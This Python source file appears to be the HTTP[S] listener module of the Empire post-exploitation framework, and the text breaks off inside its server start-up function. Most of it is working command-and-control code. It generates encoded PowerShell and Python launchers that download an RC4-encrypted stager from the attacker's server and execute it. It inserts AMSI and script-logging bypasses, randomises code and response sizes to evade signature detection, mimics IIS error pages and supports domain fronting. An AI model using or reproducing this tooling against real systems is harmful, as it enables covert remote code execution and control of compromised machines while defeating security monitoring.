import logging
import base64
import sys
import random
import string
import os
import ssl
import time
import copy
import json
import sys
from pydispatch import dispatcher
from flask import Flask, request, make_response, send_from_directory
# Empire imports
from lib.common import helpers
from lib.common import agents
from lib.common import encryption
from lib.common import packets
from lib.common import messages
from lib.common import templating
from lib.common import obfuscation
from lib.common import bypasses


class Listener:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'HTTP[S]',

            'Author': ['@harmj0y'],

            'Description': ('Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach.'),

            'Category' : ('client_server'),

            'Comments': []
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name' : {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'http'
            },
            'Host' : {
                'Description'   :   'Hostname/IP for staging.',
                'Required'      :   True,
                'Value'         :   "http://%s" % (helpers.lhost())
            },
            'BindIP' : {
                'Description'   :   'The IP to bind to on the control server.',
                'Required'      :   True,
                'Value'         :   '0.0.0.0'
            },
            'Port' : {
                'Description'   :   'Port for the listener.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Launcher' : {
                'Description'   :   'Launcher string.',
                'Required'      :   True,
                'Value'         :   'powershell -noP -sta -w 1 -enc '
            },
            'StagingKey' : {
                'Description'   :   'Staging key for initial agent negotiation.',
                'Required'      :   True,
                'Value'         :   '2c103f2c4ed1e59c0b4e2e01821770fa'
            },
            'DefaultDelay' : {
                'Description'   :   'Agent delay/reach back interval (in seconds).',
                'Required'      :   True,
                'Value'         :   5
            },
            'DefaultJitter' : {
                'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
                'Required'      :   True,
                'Value'         :   0.0
            },
            'DefaultLostLimit' : {
                'Description'   :   'Number of missed checkins before exiting',
                'Required'      :   True,
                'Value'         :   60
            },
            'DefaultProfile' : {
                'Description'   :   'Default communication profile for the agent.',
                'Required'      :   True,
                'Value'         :   "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
            },
            'CertPath' : {
                'Description'   :   'Certificate path for https listeners.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'KillDate' : {
                'Description'   :   'Date for the listener to exit (MM/dd/yyyy).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WorkingHours' : {
                'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Headers' : {
                'Description'   :   'Headers for the control server.',
                'Required'      :   True,
                'Value'         :   'Server:Microsoft-IIS/7.5'
            },
            'Cookie' : {
                'Description'   :   'Custom Cookie Name',
                'Required'      :   False,
                'Value'         :   ''
            },
            'StagerURI' : {
                'Description'   :   'URI for the stager. Must use /download/. Example: /download/stager.php',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'SlackToken' : {
                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SlackChannel' : {
                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
                'Required'      :   False,
                'Value'         :   '#general'
            }
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {}

        # optional/specific for this module
        self.app = None
        self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]

        # set the default staging key to the controller db default
        self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])

        # randomize the length of the default_response and index_page headers to evade signature based scans
        self.header_offset = random.randint(0, 64)

        self.session_cookie = ''

        # check if the current session cookie not empty and then generate random cookie
        if self.session_cookie == '':
            self.options['Cookie']['Value'] = self.generate_cookie()

    def default_response(self):
        """
        Returns an IIS 7.5 404 not found page.
        """

        return '\n'.join([
            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
            '<html xmlns="http://www.w3.org/1999/xhtml">',
            '<head>',
            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>',
            '<title>404 - File or directory not found.</title>',
            '<style type="text/css">',
            '<!--',
            'body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}',
            'fieldset{padding:0 15px 10px 15px;}',
            'h1{font-size:2.4em;margin:0;color:#FFF;}',
            'h2{font-size:1.7em;margin:0;color:#CC0000;}',
            'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}',
            '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
            'background-color:#555555;}',
            '#content{margin:0 0 0 2%;position:relative;}',
            '.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}',
            '-->',
            '</style>',
            '</head>',
            '<body>',
            '<div id="header"><h1>Server Error</h1></div>',
            '<div id="content">',
            ' <div class="content-container"><fieldset>',
            '  <h2>404 - File or directory not found.</h2>',
            '  <h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>',
            ' </fieldset></div>',
            '</div>',
            '</body>',
            '</html>',
            ' ' * self.header_offset,  # randomize the length of the header to evade signature based detection
        ])

    def index_page(self):
        """
        Returns a default HTTP server page.
        """

        return '\n'.join([
            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
            '<html xmlns="http://www.w3.org/1999/xhtml">',
            '<head>',
            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />',
            '<title>IIS7</title>',
            '<style type="text/css">',
            '<!--',
            'body {',
            '    color:#000000;',
            '    background-color:#B3B3B3;',
            '    margin:0;',
            '}',
            '',
            '#container {',
            '    margin-left:auto;',
            '    margin-right:auto;',
            '    text-align:center;',
            '    }',
            '',
            'a img {',
            '    border:none;',
            '}',
            '',
            '-->',
            '</style>',
            '</head>',
            '<body>',
            '<div id="container">',
            '<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="welcome.png" alt="IIS7" width="571" height="411" /></a>',
            '</div>',
            '</body>',
            '</html>',
        ])

    def validate_options(self):
        """
        Validate all options for this listener.
        """

        self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]

        for key in self.options:
            if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                print helpers.color("[!] Option \"%s\" is required." % (key))
                return False
        # If we've selected an HTTPS listener without specifying CertPath, let us know.
        if self.options['Host']['Value'].startswith('https') and self.options['CertPath']['Value'] == '':
            print helpers.color("[!] HTTPS selected but no CertPath specified.")
            return False
        return True


    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
        """
        Generate a basic launcher for the specified listener.
        """

        if not language:
            print helpers.color('[!] listeners/http generate_launcher(): no language specified!')

        if listenerName and (listenerName in self.threads) and (listenerName in self.mainMenu.listeners.activeListeners):

            # extract the set options for this instantiated listener
            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
            host = listenerOptions['Host']['Value']
            launcher = listenerOptions['Launcher']['Value']
            stagingKey = listenerOptions['StagingKey']['Value']
            profile = listenerOptions['DefaultProfile']['Value']
            uris = [a for a in profile.split('|')[0].split(',')]
            stage0 = random.choice(uris)
            customHeaders = profile.split('|')[2:]

            cookie = listenerOptions['Cookie']['Value']

            # generate new cookie if the current session cookie is empty to avoid empty cookie if create multiple listeners
            if cookie == '':
                generate = self.generate_cookie()
                listenerOptions['Cookie']['Value'] = generate
                cookie = generate

            if language.startswith('po'):
                # PowerShell

                stager = '$ErrorActionPreference = \"SilentlyContinue\";'

		if AMSIBypass:
			stager += bypasses.AMSIBypass()
                if safeChecks.lower() == 'true':
                    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
                    # ScriptBlock Logging bypass
                    if scriptLogBypass:
                        stager += bypasses.scriptBlockLogBypass()
                    # @mattifestation's AMSI bypass
                    if AMSIBypass:
                        stager += bypasses.AMSIBypass()
                    # rastamouse AMSI bypass
                    if AMSIBypass2:
                        stager += bypasses.AMSIBypass2()
                    stager += "};"
                    stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")

                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+"=New-Object System.Net.WebClient;")

                if userAgent.lower() == 'default':
                    profile = listenerOptions['DefaultProfile']['Value']
                    userAgent = profile.split('|')[1]
                stager += "$u='"+userAgent+"';"

                if 'https' in host:
                    # allow for self-signed certificates for https connections
                    stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

                if userAgent.lower() != 'none':
                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+'.Headers.Add(')
                    stager += "'User-Agent',$u);"

                    if proxy.lower() != 'none':
                        if proxy.lower() == 'default':
                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                        else:
                            # TODO: implement form for other proxy
                            stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy('")
                            stager += proxy.lower()
                            stager += helpers.randomize_capitalization("');")
                            stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy = $proxy;")
                        if proxyCreds.lower() != 'none':
                            if proxyCreds.lower() == "default":
                                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                            else:
                                # TODO: implement form for other proxy credentials
                                username = proxyCreds.split(':')[0]
                                password = proxyCreds.split(':')[1]
                                if len(username.split('\\')) > 1:
                                    usr = username.split('\\')[1]
                                    domain = username.split('\\')[0]
                                    stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
                                else:
                                    usr = username.split('\\')[0]
                                    stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"');"
                                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Proxy.Credentials = $netcred;")

                        #save the proxy settings to use during the entire staging process and the agent
                        stager += "$Script:Proxy = $"+helpers.generate_random_script_var_name("wc")+".Proxy;"

                # TODO: reimplement stager retries?
                #check if we're using IPv6
                listenerOptions = copy.deepcopy(listenerOptions)
                bindIP = listenerOptions['BindIP']['Value']
                port = listenerOptions['Port']['Value']
                if ':' in bindIP:
                    if "http" in host:
                        if "https" in host:
                            host = 'https://' + '[' + str(bindIP) + ']' + ":" + str(port)
                        else:
                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port)

                # code to turn the key string into a byte array
                stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                stager += "'%s');" % (stagingKey)

                # this is the minimized RC4 stager code from rc4.ps1
                stager += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                b64RoutingPacket = base64.b64encode(routingPacket)

                stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"

                #Add custom headers if any
                if customHeaders != []:
                    for header in customHeaders:
                        headerKey = header.split(':')[0]
                        headerValue = header.split(':')[1]
                        #If host header defined, assume domain fronting is in use and add a call to the base URL first
                        #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                        if headerKey.lower() == "host":
                            stager += helpers.randomize_capitalization("try{$ig=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser)}catch{};")

                        stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
                        stager += "\"%s\",\"%s\");" % (headerKey, headerValue)

                # add the RC4 packet to a cookie
                stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
                stager += "\"Cookie\",\"%s=%s\");" % (cookie, b64RoutingPacket)

                stager += helpers.randomize_capitalization("$data=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser+$t);")
                stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")

                # decode everything and kick it over to IEX to kick off execution
                stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")

                if obfuscate:
                    stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                # base64 encode the stager and return it
                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                    return helpers.powershell_launcher(stager, launcher)
                else:
                    # otherwise return the case-randomized stager
                    return stager

            if language.startswith('py'):
                # Python

                launcherBase = 'import sys;'
                if "https" in host:
                    # monkey patch ssl woohooo
                    launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"

                try:
                    if safeChecks.lower() == 'true':
                        launcherBase += "import re, subprocess;"
                        launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
                        launcherBase += "out, err = ps.communicate()\n"
                        launcherBase += "if re.search(\"Little Snitch\", out):\n"
                        launcherBase += "   sys.exit()\n"
                except Exception as e:
                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
                    print helpers.color(p, color='red')

                if userAgent.lower() == 'default':
                    profile = listenerOptions['DefaultProfile']['Value']
                    userAgent = profile.split('|')[1]

                launcherBase += "import urllib2;\n"
                launcherBase += "UA='%s';" % (userAgent)
                launcherBase += "server='%s';t='%s';" % (host, stage0)

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
                b64RoutingPacket = base64.b64encode(routingPacket)

                launcherBase += "req=urllib2.Request(server+t);\n"
                # add the RC4 packet to a cookie
                launcherBase += "req.add_header('User-Agent',UA);\n"
                launcherBase += "req.add_header('Cookie',\"%s=%s\");\n" % (cookie,b64RoutingPacket)

                # Add custom headers if any
                if customHeaders != []:
                    for header in customHeaders:
                        headerKey = header.split(':')[0]
                        headerValue = header.split(':')[1]
                        #launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
                        launcherBase += "req.add_header(\"%s\",\"%s\");\n" % (headerKey, headerValue)


                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        launcherBase += "proxy = urllib2.ProxyHandler();\n"
                    else:
                        proto = proxy.split(':')[0]
                        launcherBase += "proxy = urllib2.ProxyHandler({'"+proto+"':'"+proxy+"'});\n"

                    if proxyCreds != "none":
                        if proxyCreds == "default":
                            launcherBase += "o = urllib2.build_opener(proxy);\n"
                        else:
                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
                            username = proxyCreds.split(':')[0]
                            password = proxyCreds.split(':')[1]
                            launcherBase += "proxy_auth_handler.add_password(None,'"+proxy+"','"+username+"','"+password+"');\n"
                            launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
                    else:
                        launcherBase += "o = urllib2.build_opener(proxy);\n"
                else:
                    launcherBase += "o = urllib2.build_opener();\n"

                #install proxy and creds globally, so they can be used with urlopen.
                launcherBase += "urllib2.install_opener(o);\n"

                # download the stager and extract the IV

                launcherBase += "a=urllib2.urlopen(req).read();\n"
                launcherBase += "IV=a[0:4];"
                launcherBase += "data=a[4:];"
                launcherBase += "key=IV+'%s';" % (stagingKey)

                # RC4 decryption
                launcherBase += "S,j,out=range(256),0,[]\n"
                launcherBase += "for i in range(256):\n"
                launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "i=j=0\n"
                launcherBase += "for char in data:\n"
                launcherBase += "    i=(i+1)%256\n"
                launcherBase += "    j=(j+S[i])%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
                launcherBase += "exec(''.join(out))"

                if encode:
                    launchEncoded = base64.b64encode(launcherBase)
                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
                    return launcher
                else:
                    return launcherBase

            else:
                print helpers.color("[!] listeners/http generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module.")

        else:
            print helpers.color("[!] listeners/http generate_launcher(): invalid listener name specification!")


    def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
        """
        Generate the stager code needed for communications with this listener.
        """

        if not language:
            print helpers.color('[!] listeners/http generate_stager(): no language specified!')
            return None


        profile = listenerOptions['DefaultProfile']['Value']
        uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
        launcher = listenerOptions['Launcher']['Value']
        stagingKey = listenerOptions['StagingKey']['Value']
        workingHours = listenerOptions['WorkingHours']['Value']
        killDate = listenerOptions['KillDate']['Value']
        host = listenerOptions['Host']['Value']
        customHeaders = profile.split('|')[2:]

        # select some random URIs for staging from the main profile
        stage1 = random.choice(uris)
        stage2 = random.choice(uris)

        if language.lower() == 'powershell':

            # read in the stager base
            f = open("%s/data/agent/stagers/http.ps1" % (self.mainMenu.installPath))
            stager = f.read()
            f.close()

            # make sure the server ends with "/"
            if not host.endswith("/"):
                host += "/"

            #Patch in custom Headers
            remove = []
            if customHeaders != []:
                for key in customHeaders:
                    value = key.split(":")
                    if 'cookie' in value[0].lower() and value[1]:
                        continue
                    remove += value
                headers = ','.join(remove)
                #headers = ','.join(customHeaders)
                stager = stager.replace("$customHeaders = \"\";","$customHeaders = \""+headers+"\";")

            #patch in working hours, if any
            if workingHours != "":
                stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)

            #Patch in the killdate, if any
            if killDate != "":
                stager = stager.replace('REPLACE_KILLDATE', killDate)

            # patch the server and key information
            stager = stager.replace('REPLACE_SERVER', host)
            stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
            stager = stager.replace('index.jsp', stage1)
            stager = stager.replace('index.php', stage2)

            randomizedStager = ''

            for line in stager.split("\n"):
                line = line.strip()
                # skip commented line
                if not line.startswith("#"):
                    # randomize capitalization of lines without quoted strings
                    if "\"" not in line:
                        randomizedStager += helpers.randomize_capitalization(line)
                    else:
                        randomizedStager += line

            if obfuscate:
                randomizedStager = helpers.obfuscate(self.mainMenu.installPath, randomizedStager, obfuscationCommand=obfuscationCommand)
            # base64 encode the stager and return it
            if encode:
                return helpers.enc_powershell(randomizedStager)
            elif encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV+stagingKey, randomizedStager)
            else:
                # otherwise just return the case-randomized stager
                return randomizedStager

        elif language.lower() == 'python':
            template_path = [
                os.path.join(self.mainMenu.installPath, '/data/agent/stagers'),
                os.path.join(self.mainMenu.installPath, './data/agent/stagers')]
            eng = templating.TemplateEngine(template_path)
            template = eng.get_template('http.py')

            template_options = {
                    'working_hours': workingHours,
                    'kill_date': killDate,
                    'staging_key': stagingKey,
                    'profile': profile,
                    'stage_1': stage1,
                    'stage_2': stage2
                    }

            stager = template.render(template_options)
            stager = obfuscation.py_minify(stager)

            # base64 encode the stager and return it
            if encode:
                return base64.b64encode(stager)
            if encrypt:
                # return an encrypted version of the stager ("normal" staging)
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV+stagingKey, stager)
            else:
                # otherwise return the standard stager
                return stager

        else:
            print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")


    def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""):
        """
        Generate the full agent code needed for communications with this listener.
        """

        if not language:
            print helpers.color('[!] listeners/http generate_agent(): no language specified!')
            return None

        language = language.lower()
        delay = listenerOptions['DefaultDelay']['Value']
        jitter = listenerOptions['DefaultJitter']['Value']
        profile = listenerOptions['DefaultProfile']['Value']
        lostLimit = listenerOptions['DefaultLostLimit']['Value']
        killDate = listenerOptions['KillDate']['Value']
        workingHours = listenerOptions['WorkingHours']['Value']
        b64DefaultResponse = base64.b64encode(self.default_response())

        if language == 'powershell':

            f = open(self.mainMenu.installPath + "./data/agent/agent.ps1")
            code = f.read()
            f.close()

            # patch in the comms methods
            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
            code = code.replace('REPLACE_COMMS', commsCode)

            # strip out comments and blank lines
            code = helpers.strip_powershell_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
            code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
            code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
            code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+str(b64DefaultResponse)+'"')

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
            if obfuscate:
                code = helpers.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
            return code

        elif language == 'python':
            f = open(self.mainMenu.installPath + "./data/agent/agent.py")
            code = f.read()
            f.close()

            # patch in the comms methods
            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
            code = code.replace('REPLACE_COMMS', commsCode)

            # strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace('delay = 60', 'delay = %s' % (delay))
            code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
            code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
            code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
            code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
            if workingHours != "":
                code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))

            return code
        else:
            print helpers.color("[!] listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")


    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """

        if language:
            if language.lower() == 'powershell':

                updateServers = """
                    $Script:ControlServers = @("%s");
                    $Script:ServerIndex = 0;
                """ % (listenerOptions['Host']['Value'])

                if listenerOptions['Host']['Value'].startswith('https'):
                    updateServers += "\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

                getTask = """
                    $script:GetTask = {

                        try {
                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {

                                # meta 'TASKING_REQUEST' : 4
                                $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)

                                # build the web request object
                                $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient

                                # set the proxy settings for the WC to be the default system settings
                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                if($Script:Proxy) {
                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
                                }

                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
                                $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie",\"""" + self.session_cookie + """=$RoutingCookie")

                                # choose a random valid URI for checkin
                                $taskURI = $script:TaskURIs | Get-Random
                                $result = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
                                $result
                            }
                        }
                        catch [Net.WebException] {
                            $script:MissedCheckins += 1
                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                                # restart key negotiation
                                Start-Negotiate -S "$ser" -SK $SK -UA $ua
                            }
                        }
                    }
                """

                sendMessage = """
                    $script:SendMessage = {
                        param($Packets)

                        if($Packets) {
                            # build and encrypt the response packet
                            $EncBytes = Encrypt-Bytes $Packets

                            # build the top level RC4 "routing packet"
                            # meta 'RESULT_POST' : 5
                            $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5

                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
                                # build the web request object
                                $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
                                # set the proxy settings for the WC to be the default system settings
                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                if($Script:Proxy) {
                                    $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
                                }

                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $Script:UserAgent)
                                $Script:Headers.GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}

                                try {
                                    # get a random posting URI
                                    $taskURI = $Script:TaskURIs | Get-Random
                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
                                }
                                catch [System.Net.WebException]{
                                    # exception posting data...
                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                                        # restart key negotiation
                                        Start-Negotiate -S "$ser" -SK $SK -UA $ua
                                    }
                                }
                            }
                        }
                    }
                """

                return updateServers + getTask + sendMessage

            elif language.lower() == 'python':

                updateServers = "server = '%s'\n"  % (listenerOptions['Host']['Value'])

                if listenerOptions['Host']['Value'].startswith('https'):
                    updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"

                sendMessage = """
def send_message(packets=None):
    # Requests a tasking or posts data to a randomized tasking URI.
    # If packets == None, the agent GETs a tasking from the control server.
    # If packets != None, the agent encrypts the passed packets and
    #    POSTs the data to the control server.

    global missedCheckins
    global server
    global headers
    global taskURIs

    data = None
    if packets:
        data = ''.join(packets)
        # aes_encrypt_then_hmac is in stager.py
        encData = aes_encrypt_then_hmac(key, data)
        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
    else:
        # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
        #   meta TASKING_REQUEST = 4
        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
        b64routingPacket = base64.b64encode(routingPacket)
        headers['Cookie'] = \"""" + self.session_cookie + """=%s" % (b64routingPacket)

    taskURI = random.sample(taskURIs, 1)[0]
    requestUri = server + taskURI

    try:
        data = (urllib2.urlopen(urllib2.Request(requestUri, data, headers))).read()
        return ('200', data)

    except urllib2.HTTPError as HTTPError:
        # if the server is reached, but returns an erro (like 404)
        missedCheckins = missedCheckins + 1
        #if signaled for restaging, exit.
        if HTTPError.code == 401:
            sys.exit(0)

        return (HTTPError.code, '')

    except urllib2.URLError as URLerror:
        # if the server cannot be reached
        missedCheckins = missedCheckins + 1
        return (URLerror.reason, '')

    return ('', '')
"""
                return updateServers + sendMessage

            else:
                print helpers.color("[!] listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
        else:
            print helpers.color('[!] listeners/http generate_comms(): no language specified!')


    def start_server(self, listenerOptions):
        """
        Threaded function that actually starts up the Flask server.
        """

        # make a copy of the currently set listener options for later stager/agent generation
        listenerOptions = copy.deepcopy(listenerOptions)

        # suppress the normal Flask output
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)

        bindIP = listenerOptions['BindIP']['Value']
        host = listenerOptions['Host']['Value']
        port = listenerOptions['Port']['Value']
        stagingKey = listenerOptions['StagingKey']['Value']
        stagerURI = listenerOptions['StagerURI']['Value']
        userAgent = self.options['UserAgent']['Value']
        listenerName = self.options['Name']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        app = Flask(__name__)
        self.app = app


        @app.route('/download/<stager>')
        def send_stager(stager):
            if 'po' in stager:
